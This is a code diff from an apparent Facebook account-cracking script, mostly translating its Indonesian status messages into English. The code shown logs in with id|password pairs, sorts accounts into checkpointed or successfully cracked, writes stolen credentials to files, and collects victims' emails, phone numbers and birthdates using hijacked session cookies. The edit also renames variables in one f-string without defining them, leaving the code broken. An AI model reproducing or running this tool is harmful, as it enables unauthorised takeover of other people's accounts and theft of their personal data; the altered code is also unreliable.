@@ -746,7 +746,7 @@ def crack3(idf,pwv):
 							tahun += nenen+", "
 					except:pass
 
-					infoakun += (f"[✓] Nama Akun       : {nama}\n[✓] Jumlah Teman    : {teman}\n[✓] Jumlah Pengikut : {pengikut}\n[✓] Email Aktif     : {email}\n[✓] Nomor Aktif     : {nomer}\n[✓] Tahun Akun      : {tahun}\n[✓] Tanggal Lahir   : {ttl}\n")
+					infoakun += (f"[✓] Nama Account       : {nama}\n[✓] Amount Friend    : {friend}\n[✓] Amount Follower : {follower}\n[✓] Email Active     : {email}\n[✓] Number Active     : {number}\n[✓] Year Active      : {year}\n[✓] Date Born   : {ttl}\n")
 
 					hit1, hit2 = 0,0
 					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
@@ -808,13 +808,13 @@ def ceker(idf,pw):
 		cp+=1
 		opsi = kent.find_all('option')
 		if len(opsi)==0:
-			print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
+			print('\r%s---> Tap Yes / A2F (Check Login In Lite/Mbasic%s)'%(hh,x))
 		else:
 			for opsii in opsi:
 				print('\r%s---> %s%s'%(kk,opsii.text,x))
 	except Exception as c:
 		print('\r%s++++ %s|%s ----> CP       %s'%(b,idf,pw,x))
-		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login Di Lite/Mbasic)%s'%(u,x))
+		print('\r%s---> Tidak Dapat Mengecek Opsi (Cek Login In Lite/Mbasic)%s'%(u,x))
 		open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
 		cp+=1
 
@@ -834,7 +834,7 @@ def cek_opsi():
 			except IndexError:
 				time.sleep(2)
 				print('\r%s++++ %s ----> Error      %s'%(b,kes,x))
-				print('\r%s---> Pemisah Tidak Didukung Untuk Program Ini%s'%(u,x))
+				print('\r%s---> Separator Not Supported For This Program%s'%(u,x))
 				continue
 			bi = random.choice([u,k,kk,b,h,hh])
 			print('\r%s---> %s/%s ---> { %s }%s'%(bi,love,len(akun),id,x), end=' ');sys.stdout.flush()
@@ -855,13 +855,13 @@ def cek_opsi():
 					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
 					opsi = kent.find_all('option')
 					if len(opsi)==0:
-						print('\r%s---> Tap Yes / A2F (Cek Login Di Lite/Mbasic%s)'%(hh,x))
+						print('\r%s---> Tap Yes / A2F (Check Login In Lite/Mbasic%s)'%(hh,x))
 					else:
 						for opsii in opsi:
 							print('\r%s---> %s%s'%(kk,opsii.text,x))
 				except:
 					print('\r%s++++ %s|%s ----> CP       %s'%(b,id,pw,x))
-					print('\r%s---> Tidak Dapat Mengecek Opsi%s'%(u,x))
+					print('\r%s---> Could Not Check Option%s'%(u,x))
 			elif "c_user" in ses.cookies.get_dict().keys():
 				print('\r%s++++ %s|%s ----> OK       %s'%(h,id,pw,x))
 			else:
